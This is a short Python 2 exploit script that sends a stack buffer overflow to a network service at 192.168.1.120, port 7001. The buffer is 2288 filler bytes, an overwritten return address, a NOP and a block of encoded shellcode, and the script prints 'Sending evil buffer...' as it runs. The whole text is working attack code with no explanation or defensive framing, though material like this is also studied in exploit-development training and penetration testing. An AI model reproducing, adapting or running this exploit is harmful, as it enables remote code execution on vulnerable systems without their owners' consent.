#!/usr/bin/python
import socket  
shellcode = ("\xba\xaa\x26\xdd\xc9\xd9\xca\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x50\x12\x83\xc0\x04\x03\xfa\x28\x3f\x3c\x06\xdc\x3d"
"\xbf\xf6\x1d\x22\x49\x13\x2c\x62\x2d\x50\x1f\x52\x25\x34\xac"
"\x19\x6b\xac\x27\x6f\xa4\xc3\x80\xda\x92\xea\x11\x76\xe6\x6d"
"\x92\x85\x3b\x4d\xab\x45\x4e\x8c\xec\xb8\xa3\xdc\xa5\xb7\x16"
"\xf0\xc2\x82\xaa\x7b\x98\x03\xab\x98\x69\x25\x9a\x0f\xe1\x7c"
"\x3c\xae\x26\xf5\x75\xa8\x2b\x30\xcf\x43\x9f\xce\xce\x85\xd1"
"\x2f\x7c\xe8\xdd\xdd\x7c\x2d\xd9\x3d\x0b\x47\x19\xc3\x0c\x9c"
"\x63\x1f\x98\x06\xc3\xd4\x3a\xe2\xf5\x39\xdc\x61\xf9\xf6\xaa"
"\x2d\x1e\x08\x7e\x46\x1a\x81\x81\x88\xaa\xd1\xa5\x0c\xf6\x82"
"\xc4\x15\x52\x64\xf8\x45\x3d\xd9\x5c\x0e\xd0\x0e\xed\x4d\xbd"
"\xe3\xdc\x6d\x3d\x6c\x56\x1e\x0f\x33\xcc\x88\x23\xbc\xca\x4f"
"\x43\x97\xab\xdf\xba\x18\xcc\xf6\x78\x4c\x9c\x60\xa8\xed\x77"
"\x70\x55\x38\xd7\x20\xf9\x93\x98\x90\xb9\x43\x71\xfa\x35\xbb"
"\x61\x05\x9c\xd4\x08\xfc\x77\x1b\x64\xff\x5f\xf3\x77\xff\x5b"
"\xd6\xf1\x19\x09\xc6\x57\xb2\xa6\x7f\xf2\x48\x56\x7f\x28\x35"
"\x58\x0b\xdf\xca\x17\xfc\xaa\xd8\xc0\x0c\xe1\x82\x47\x12\xdf"
"\xaa\x04\x81\x84\x2a\x42\xba\x12\x7d\x03\x0c\x6b\xeb\xb9\x37"
"\xc5\x09\x40\xa1\x2e\x89\x9f\x12\xb0\x10\x6d\x2e\x96\x02\xab"
"\xaf\x92\x76\x63\xe6\x4c\x20\xc5\x50\x3f\x9a\x9f\x0f\xe9\x4a"
"\x59\x7c\x2a\x0c\x66\xa9\xdc\xf0\xd7\x04\x99\x0f\xd7\xc0\x2d"
"\x68\x05\x71\xd1\xa3\x8d\x81\x98\xe9\xa4\x09\x45\x78\xf5\x57"
"\x76\x57\x3a\x6e\xf5\x5d\xc3\x95\xe5\x14\xc6\xd2\xa1\xc5\xba"
"\x4b\x44\xe9\x69\x6b\x4d") 
buffer ="A"*2288 + "\xcf\x10\x80\x14"+"\x90"+ shellcode
try:
  print "\nSending evil buffer..."
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.1.120", 7001))
  s.send(buffer)
  s.close()
  print "\nDone!"
except:
  print "\nCould not connect!"